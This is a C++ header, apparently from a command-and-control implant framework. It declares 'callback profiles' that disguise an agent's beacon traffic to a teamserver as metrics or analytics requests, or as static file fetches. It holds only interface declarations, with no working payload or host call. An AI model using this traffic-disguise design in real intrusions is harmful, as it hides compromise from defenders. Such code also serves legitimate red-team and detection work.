#pragma once

#include <string>
#include <vector>

namespace nagomio {

// Pluggable callback profile (B2). A profile rewrites the URL path, user
// agent, and (optionally) the body shape that the agent uses for /beacon
// and /response calls. The teamserver listens on every profile path
// (default, /api/v2/metrics, /track, /metrics/v1/events) and dispatches
// them to the same handlers.
struct Profile {
    std::string name;
    // Path for the beacon POST (or GET, when `beacon_method` is "GET").
    std::string beacon_path;
    // Path for the response POST.
    std::string response_path;
    // User-Agent string (or empty to use the agent's default).
    std::string user_agent;
    // Header for the agent PSK HMAC. Defaults to "x-nagomio-agent-token".
    std::string auth_header;
    // The body for /beacon is wrapped in this JSON object so the on-the-wire
    // shape resembles a metrics/analytics payload. Empty == no wrapping.
    // Use "{body}" as a placeholder for the original beacon JSON. The agent
    // calls `wrap_beacon` / `unwrap_response` on the wire body.
    std::string body_template;
    // HTTP method for the beacon. "POST" (default) or "GET" (used by the
    // dead_drop profile so the agent's only outbound traffic looks like a
    // static file fetch).
    std::string beacon_method;
};

const Profile& active_profile();

// Returns the path the agent should POST to for beacons.
const std::string& beacon_path();
// Returns the path the agent should POST to for responses.
const std::string& response_path();
// Returns the HTTP method ("POST" or "GET") for the beacon.
const std::string& beacon_method();

// Load a profile by name. Falls back to "default" if unknown.
void set_profile_by_name(const std::string& name);

// Wrap a beacon body in the profile's body template. Returns the wire body.
std::string wrap_beacon(const std::string& inner_json);

// Unwrap a server response that was wrapped in the profile template. Returns
// the inner JSON.
std::string unwrap_response(const std::string& wire_body);

} // namespace nagomio